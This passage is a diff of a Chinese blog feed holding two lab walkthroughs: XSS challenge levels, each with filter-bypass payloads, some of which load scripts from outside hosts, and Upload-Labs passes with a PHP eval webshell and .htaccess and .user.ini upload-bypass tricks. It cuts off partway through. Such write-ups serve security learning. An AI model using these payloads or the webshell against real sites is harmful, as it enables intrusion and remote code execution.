+<br>
+<h2 id="0x01">0x01</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  return '&lt;textarea&gt;' + input + '&lt;/textarea&gt;'
+}
+
+前端代码:
+&lt;textarea&gt;&lt;/textarea&gt;
+</code></pre>
+<p>服务器虽然没有进行过滤,但是前端的<code>textarea</code>标签会将JavaScript代码文本化直接输出，所以添加一个结束标签凑成一对就能绕过</p>
+<pre><code class="language-javascript">payload:
+&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-02.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x02">0x02</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  return '&lt;input type=&quot;name&quot; value=&quot;' + input + '&quot;&gt;'
+}
+
+前端代码:
+&lt;input type=&quot;name&quot; value=&quot;&quot;&gt;
+</code></pre>
+<p>服务器依旧没有进行过滤,不过这次代码插入在<code>input</code>标签下的<code>value</code>属性下,依旧会吧JavaScript代码文本化直接输出,因此将<code>value的双引号</code>和<code>input的右尖括号</code>补全 即可绕过</p>
+<pre><code class="language-javascript">payload:
+&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-03.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x03">0x03</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  const stripBracketsRe = /[()]/g
+  input = input.replace(stripBracketsRe, '')
+  return input
+}
+</code></pre>
+<p>这题服务器终于对JavaScript代码进行过滤了,使用是正则表达式匹配,如果匹配成功就替换成空</p>
+<ul>
+<li>正则表达式<code>/[()]/g</code></li>
+<li>末尾的g是<code>全局匹配</code></li>
+<li>两条斜杠是代表<code>开始与结束的位置</code></li>
+<li>方括号是表示匹配<code>方括号中的任意字符</code></li>
+<li>这个正则表达式的意思就是,全局匹配<code>左括号和有括号</code></li>
+</ul>
+<p>染过方法有很多</p>
+<pre><code class="language-html">payload:
+可用反引号代替括号
+&lt;img src=&quot;&quot; onerror=alert`1`&gt;
+
+可用Html实体编码表示左右括号
+&lt;img src=&quot;&quot; onerror=alert&amp;lpar;1&amp;rpar;&gt;
+&lt;img src=&quot;&quot; onerror=alert&amp;#40;1&amp;#41;&gt;
+&amp;lpar;和&amp;#40;表示左括号(
+&amp;rpar;和&amp;#41;表示右括号)
+
+可以引用外部js文件
+&lt;script src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-04.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x04">0x04</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  const stripBracketsRe = /[()`]/g
+  input = input.replace(stripBracketsRe, '')
+  return input
+}
+</code></pre>
+<p>这题和0x03很像,就是正则表达式多了个反引号检测,所以0x03的payload除了第一条,其他都能用</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-05.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x05">0x05</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  input = input.replace(/--&gt;/g, '😂')
+  return '&lt;!-- ' + input + ' --&gt;'
+}
+
+前端代码:
+&lt;!--  --&gt;
+</code></pre>
+<p>服务器使用正则表达式进行了过滤,<code>--&gt;</code>被替换成😂,然而<code>&lt;!--</code>与<code>--&gt;</code>组成一个HTML注释,但是HTML还有一种与能与<code>&lt;!--</code>组成,就是<code>--!&gt;</code>,HTML会自动转为<code>--&gt;</code></p>
+<pre><code class="language-javascript">payload:
+--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-06.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x06">0x06</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  input = input.replace(/auto|on.*=|&gt;/ig, '_')
+  return `&lt;input value=1 ${input} type=&quot;text&quot;&gt;`
+}
+
+前端代码:
+&lt;input value=1  type=&quot;text&quot;&gt;
+</code></pre>
+<p>服务器依旧使用正则表达式过滤,把<code>auto</code>、<code>&gt;</code>、<code>on来头=结尾</code>,正则表达式的<code>i</code>是<code>不区分大小写</code>,但是正则表达式没有过滤换行</p>
+<pre><code class="language-javascript">payload:
+onclick
+=alert(1)
+单机文本框即可触发JavaScript代码
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-07.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x07">0x07</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi
+
+  input = input.replace(stripTagsRe, '')
+  return `&lt;article&gt;${input}&lt;/article&gt;`
+}
+
+前端代码:
+&lt;article&gt;&lt;/article&gt;
+</code></pre>
+<p>服务器使用正则表达式,对<code>&lt;&gt;</code>括起来的内容进行过滤替换成空,但是由于<code>HTML</code>的容错性极高,所以,对于不闭合也能接受</p>
+<pre><code class="language-html">payload:
+&lt;img src=&quot;&quot; onerror=alert(1)
+     后面加\\ 空格 回车 才能触发
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-08.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x08">0x08</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (src) {
+  src = src.replace(/&lt;\/style&gt;/ig, '/* \u574F\u4EBA */')
+  return `
+    &lt;style&gt;
+      ${src}
+    &lt;/style&gt;
+  `
+}
+
+前端代码:
+&lt;style&gt;
+      
+    &lt;/style&gt;
+</code></pre>
+<p>服务器正则表达式过滤了我们想要闭合的<code>style标签</code>,且忽略了大小写,但是正则表达式是以一个整体来判断,所以在style闭合标签里面加入空格,就能绕过</p>
+<pre><code class="language-javascript">payload:
+&lt;/style &gt;
+&lt;script&gt; alert(1) &lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-09.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x09">0x09</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  let domainRe = /^https?:\/\/www\.segmentfault\.com/
+  if (domainRe.test(input)) {
+    return `&lt;script src=&quot;${input}&quot;&gt;&lt;/script&gt;`
+  }
+  return 'Invalid URL'
+}
+
+前端代码:
+Invalid URL
+</code></pre>
+<p>服务器使用正则表达式限制了,必须使用<code>https://www.sogmentfault.com</code>开头,且放在<code>script</code>标签的<code>src</code>属性里面.所以我们需要闭合绕过</p>
+<pre><code class="language-javascript">payload:
+https://www.segmentfault.com&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;https://xss.haozi.me/j.js&quot;
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-10.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x0a">0x0A</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  function escapeHtml(s) {
+    return s.replace(/&amp;/g, '&amp;amp;')
+            .replace(/'/g, '&amp;#39;')
+            .replace(/&quot;/g, '&amp;quot;')
+            .replace(/&lt;/g, '&amp;lt;')
+            .replace(/&gt;/g, '&amp;gt;')
+            .replace(/\//g, '&amp;#x2f')
+  }
+
+  const domainRe = /^https?:\/\/www\.segmentfault\.com/
+  if (domainRe.test(input)) {
+    return `&lt;script src=&quot;${escapeHtml(input)}&quot;&gt;&lt;/script&gt;`
+  }
+  return 'Invalid URL'
+}
+
+前端代码:
+Invalid URL
+</code></pre>
+<p>和<code>0x09</code>一样需要制定的Url开头,但是本题还将&quot;&amp;、`、&quot;、&lt;、&gt;、&quot;这些标点符号全部转换成HTML实体编码.因此本题不能通过闭合绕过,需要用到HTML的@特性,请求Url: www.google.com@www.youtube.com 最后访问到是 YouTube , Google相当于做了一次跳转</p>
+<pre><code class="language-javascript">payload:
+https://www.segmentfault.com@xss.haozi.me/j.js
+</code></pre>
+<p><code>注意:由于Chrome浏览器的一些安全机制,无法正常请求这个Url,所以这题改为使用Firefox浏览器</code></p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-11.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x0b">0x0B</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  input = input.toUpperCase()
+  return `&lt;h1&gt;${input}&lt;/h1&gt;`
+}
+
+前端代码:
+&lt;h1&gt;&lt;/h1&gt;
+</code></pre>
+<p>这关使用了<code>toUpperCase</code>函数对输入的字符进行大写转换,HTML标签不区分大小写,但是JavaScript代码区分,也就是说<code>ALERT</code>不能执行.但是可以将JavaScript代码进行<code>uniocde</code>编码进行绕过</p>
+<p><code>注意Unicode编码有两种结果,一个是中文转Unicode结果是\u开头的,另一个是ASCII转Unicode结果是&amp;#开头的.这里用ASCII转Unicode</code></p>
+<pre><code class="language-html">payload:
+&lt;img src=&quot;&quot; onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-12.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x0c">0x0C</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  input = input.replace(/script/ig, '')
+  input = input.toUpperCase()
+  return '&lt;h1&gt;' + input + '&lt;/h1&gt;'
+}
+
+前端代码:
+&lt;h1&gt;&lt;/h1&gt;
+</code></pre>
+<p>服务器使用正则表达式将<code>script</code>替换成空,且对输入的字符进行大写转换,使用<code>0x0B</code>的payload即可,不要相信网上用外部引入<code>j.js</code>,因为转为大写不存在这个文件</p>
+<pre><code class="language-html">payload:
+&lt;img src=&quot;&quot; onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-13.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x0d">0x0D</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  input = input.replace(/[&lt;/&quot;']/g, '')
+  return `
+    &lt;script&gt;
+          // alert('${input}')
+    &lt;/script&gt;
+  `
+}
+
+前端代码:
+&lt;script&gt;
+          // alert('')
+    &lt;/script&gt;
+</code></pre>
+<p>服务器使用正则表达式对 <code>&lt; / &quot; '</code>进行过滤替换成空,且在输入的地方进行单行注释,因为是单行注释所以换行就能绕过,但是由于后面接着<code>')</code>,所以必须屏蔽或闭合才能执行JavaScript代码,根据服务器端代码,只能使用 <code>--&gt;</code>来进行注释</p>
+<pre><code class="language-javascript">payload:(注意有一行空行)
+
+alert(1)
+--&gt;
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-14.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x0e巨坑">0x0E(巨坑!!!)</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1')
+  input = input.toUpperCase()
+  return '&lt;h1&gt;' + input + '&lt;/h1&gt;'
+}
+
+前端代码:
+&lt;h1&gt;&lt;/h1&gt;
+</code></pre>
+<p>服务器使用正则表达式对以<code>&lt;</code>开头后面接大小写字母进行替换成<code>&lt;_</code>加大写字母,导致无法使用<code>script</code>标签,且大写的JavaScript代码无法执行,没有丝毫头绪,翻了下官方WP,了解到一些骚知识</p>
+<p><code>ſ</code>是古英语中的s的写法, 转成大写是正常的<code>S</code></p>
+<p><code>这也太骚了吧!!!,玩CTF吗???脑洞这么大</code></p>
+<p><code>又是一个坑!!!,官方WP是引入j.js 由于大写转换后变成J.JS.文件不存在访问404.只能去自己的服务器写脚本引入自己的js文件</code></p>
+<pre><code class="language-javascript">payload:
+&lt;ſcript src=&quot;http://自己的服务器/ALERT.JS&quot;&gt;&lt;/script&gt;
+
+ALERT.JS:
+alert(1)
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-15.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x0f">0x0F</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  function escapeHtml(s) {
+    return s.replace(/&amp;/g, '&amp;amp;')
+            .replace(/'/g, '&amp;#39;')
+            .replace(/&quot;/g, '&amp;quot;')
+            .replace(/&lt;/g, '&amp;lt;')
+            .replace(/&gt;/g, '&amp;gt;')
+            .replace(/\//g, '&amp;#x2f;')
+  }
+  return `&lt;img src onerror=&quot;console.error('${escapeHtml(input)}')&quot;&gt;`
+}
+
+前端代码:
+&lt;img src onerror=&quot;console.error('')&quot;&gt;
+</code></pre>
+<p>服务器对<code>&amp; ' &quot; &lt; &gt; \</code>进行HTML实体编码,但是在HTML标签里面使用HTML实体编码没啥用,因为浏览器会解析HTML实体编码,所以将<code>onerror的console.error闭合</code>绕过就行了</p>
+<pre><code class="language-javascript">payload:
+')alert('1
+</code></pre>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-16.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x10">0x10</h2>
+<pre><code class="language-javascript">服务器端代码:
+function render (input) {
+  return `
+&lt;script&gt;
+  window.data = ${input}
+&lt;/script&gt;
+  `
+}
+
+前端代码:
+&lt;script&gt;
+  window.data = 
+&lt;/script&gt;
+</code></pre>
+<p>送分题???没有任何过滤,能直接执行alert(1)</p>
+<pre><code class="language-javascript">payload:
+alert(1)
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-17.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x11">0x11</h2>
+<pre><code class="language-javascript">服务器端代码:
+// from alf.nu
+function render (s) {
+  function escapeJs (s) {
+    return String(s)
+            .replace(/\\/g, '\\\\')
+            .replace(/'/g, '\\\'')
+            .replace(/&quot;/g, '\\&quot;')
+            .replace(/`/g, '\\`')
+            .replace(/&lt;/g, '\\74')
+            .replace(/&gt;/g, '\\76')
+            .replace(/\//g, '\\/')
+            .replace(/\n/g, '\\n')
+            .replace(/\r/g, '\\r')
+            .replace(/\t/g, '\\t')
+            .replace(/\f/g, '\\f')
+            .replace(/\v/g, '\\v')
+            // .replace(/\b/g, '\\b')
+            .replace(/\0/g, '\\0')
+  }
+  s = escapeJs(s)
+  return `
+&lt;script&gt;
+  var url = 'javascript:console.log(&quot;${s}&quot;)'
+  var a = document.createElement('a')
+  a.href = url
+  document.body.appendChild(a)
+  a.click()
+&lt;/script&gt;
+`
+}
+
+前端代码:
+&lt;script&gt;
+  var url = 'javascript:console.log(&quot;&quot;)'
+  var a = document.createElement('a')
+  a.href = url
+  document.body.appendChild(a)
+  a.click()
+&lt;/script&gt;
+</code></pre>
+<p>服务器过滤了一大堆字符,并在其前面添加反斜杠进行转义</p>
+<p>注意<code>console.log(&quot;${s}&quot;)</code>,当我们输入一个双引号<code>&quot;</code>,正则会变成<code>\&quot;</code>,然后整条语句变成<code>console.log(&quot;\&quot;&quot;)</code>.这样反斜杠就失去转义的作用</p>
+<pre><code class="language-javascript">payload:
+&quot;);alert(&quot;1
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-18.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="0x12">0x12</h2>
+<pre><code class="language-javascript">服务器端代码:
+// from alf.nu
+function escape (s) {
+  s = s.replace(/&quot;/g, '\\&quot;')
+  return '&lt;script&gt;console.log(&quot;' + s + '&quot;);&lt;/script&gt;'
+}
+
+前端代码:
+&lt;script&gt;console.log(&quot;&quot;);&lt;/script&gt;
+</code></pre>
+<p>服务器对双引号进行过滤,转为<code>\\&quot;</code>,把双引号和括号进行补全就能绕过</p>
+<pre><code class="language-javascript">payload:
+\&quot;);alert(1)//
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-19.png" alt="" loading="lazy"></figure>
+<br>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[文件上传漏洞总结 : Upload-Labs通关手册]]></title>
+        <id>https://M0kY4n.github.io111/post/upload-labs-tong-guan-shou-ce/</id>
+        <link href="https://M0kY4n.github.io111/post/upload-labs-tong-guan-shou-ce/">
+        </link>
+        <updated>2020-07-22T13:41:47.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="upload-labs通关手册">Upload-Labs通关手册</h1>
+<br>
+<h2 id="靶机环境">靶机环境</h2>
+<table>
+<thead>
+<tr>
+<th>浏览器</th>
+<th>Chrome</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>连接webshell工具</td>
+<td>AntSword</td>
+</tr>
+<tr>
+<td>抓包工具</td>
+<td>Burpsuite Pro</td>
+</tr>
+<tr>
+<td>路由器代理插件</td>
+<td>Proxy SwitchyOmega</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-php">#webshell代码
+
+&lt;?php
+    @eval($_REQUEST[&quot;shell&quot;]);
+?&gt;
+</code></pre>
+<br>
+<h2 id="upload-labs题型总结">Upload-Labs题型总结</h2>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/upload-labs%E9%A2%98%E5%9E%8B.png" alt="" loading="lazy"></figure>
+<h2 id="pass-01">Pass-01</h2>
+<blockquote>
+<p>本pass在客户端使用js对不合法图片进行检查！</p>
+</blockquote>
+<pre><code class="language-javascript">//JavaScript代码
+function checkFile() {
+    var file = document.getElementsByName('upload_file')[0].value;
+    if (file == null || file == &quot;&quot;) {
+        alert(&quot;请选择要上传的文件!&quot;);
+        return false;
+    }
+    //定义允许上传的文件类型
+    var allow_ext = &quot;.jpg|.png|.gif&quot;;
+    //提取上传文件的类型
+    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));
+    //判断上传文件类型是否允许上传
+    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) {
+        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;
+        alert(errMsg);
+        return false;
+    }
+}
+</code></pre>
+<h3 id="禁用javascript">禁用JavaScript</h3>
+<p>在网站设置里禁止JavaScript运行</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E7%A6%81%E7%94%A8JavaScript.png" alt="" loading="lazy"></figure>
+<h3 id="修改javascript代码">修改JavaScript代码</h3>
+<p>在Console中修改JavaScript代码并执行即可,方法很多,只要绕过判断就行,我是将判断上传文件类型是否允许上传的&quot;-1&quot;改为&quot;0&quot;</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E4%BF%AE%E6%94%B9JavaScript%E4%BB%A3%E7%A0%81.png" alt="" loading="lazy"></figure>
+<h3 id="解析上传的webshell">解析上传的WebShell</h3>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E8%BF%9E%E6%8E%A5%E8%9A%81%E5%89%91.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png" alt="" loading="lazy"></figure>
+<p>之后连接WebShell都是这个操作,后面就不演示了</p>
+<br>
+<h2 id="pass-02">Pass-02</h2>
+<blockquote>
+<p>本pass在服务端对数据包的MIME进行检查！</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '文件类型不正确，请重新上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<blockquote>
+<p>MIME科普:https://baike.baidu.com/item/MIME/2900607?fr=aladdin#4</p>
+</blockquote>
+<h3 id="设置burp代理">设置burp代理</h3>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/%E8%AE%BE%E7%BD%AEburp%E4%BB%A3%E7%90%86.png" alt="" loading="lazy"></figure>
+<h3 id="抓取数据包并修改数据">抓取数据包并修改数据</h3>
+<p>根据题目提示,修改数据包的Content-Type,符合JavaScript代码即可</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-02%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E5%8C%85.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="pass-03">Pass-03</h2>
+<blockquote>
+<p>本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array('.asp','.aspx','.php','.jsp');
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //收尾去空
+
+        if(!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            
+            if (move_uploaded_file($temp_file,$img_path)) {
+                 $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<h3 id="黑名单绕过">黑名单绕过</h3>
+<p>使用 .php3 .php4 .php5.phtml 这些后缀的WebShell上传解析</p>
+<p>前提是Apache的httpd-conf配置文件必须有</p>
+<pre><code>AddType application/x-httpd-php .php .phtml .php3 .php4 .php5
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-03%E8%BF%9E%E6%8E%A5webshell.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="pass-04">Pass-04</h2>
+<blockquote>
+<p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //收尾去空
+
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件不允许上传!';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<h3 id="重写解析规则">重写解析规则</h3>
+<blockquote>
+<p>.htaccess文件:https://baike.baidu.com/item/htaccess</p>
+</blockquote>
+<p>上传覆盖.htaccess文件，重写解析规则，将上传的带马图片以脚本的方式解析。</p>
+<p>创建.htaccess文件,为带马的a.jpg做php解析</p>
+<pre><code class="language-ini">&lt;FilesMatch &quot;a.jpg&quot;&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+</code></pre>
+<p>上传WebShell</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/Pass-04%E9%93%BE%E6%8E%A5webShell.png" alt="" loading="lazy"></figure>
+<br>
+<h2 id="pass-05">Pass-05</h2>
+<blockquote>
+<p>上传目录存在php文件（readme.php）</p>
+</blockquote>
+<pre><code class="language-php">$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+    if (file_exists(UPLOAD_PATH)) {
+        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);
+        $file_name = trim($_FILES['upload_file']['name']);
+        $file_name = deldot($file_name);//删除文件名末尾的点
+        $file_ext = strrchr($file_name, '.');
+        $file_ext = strtolower($file_ext); //转换为小写
+        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
+        $file_ext = trim($file_ext); //首尾去空
+        
+        if (!in_array($file_ext, $deny_ext)) {
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH.'/'.$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $is_upload = true;
+            } else {
+                $msg = '上传出错！';
+            }
+        } else {
+            $msg = '此文件类型不允许上传！';
+        }
+    } else {
+        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+    }
+}
+</code></pre>
+<blockquote>
+<p>.user.ini文件:https://www.php.net/manual/zh/configuration.file.per-user.php</p>
+<p>Apache CGI配置:https://blog.csdn.net/zhuanshu666/article/details/74936940</p>
+</blockquote>
+<h3 id="扩展php功能">扩展php功能</h3>
+<p>创建.user.ini文件,使得a,jpg的php代码加入上传目录的readme.php文件里</p>
+<pre><code class="language-ini">auto_prepend_file=a.jpg
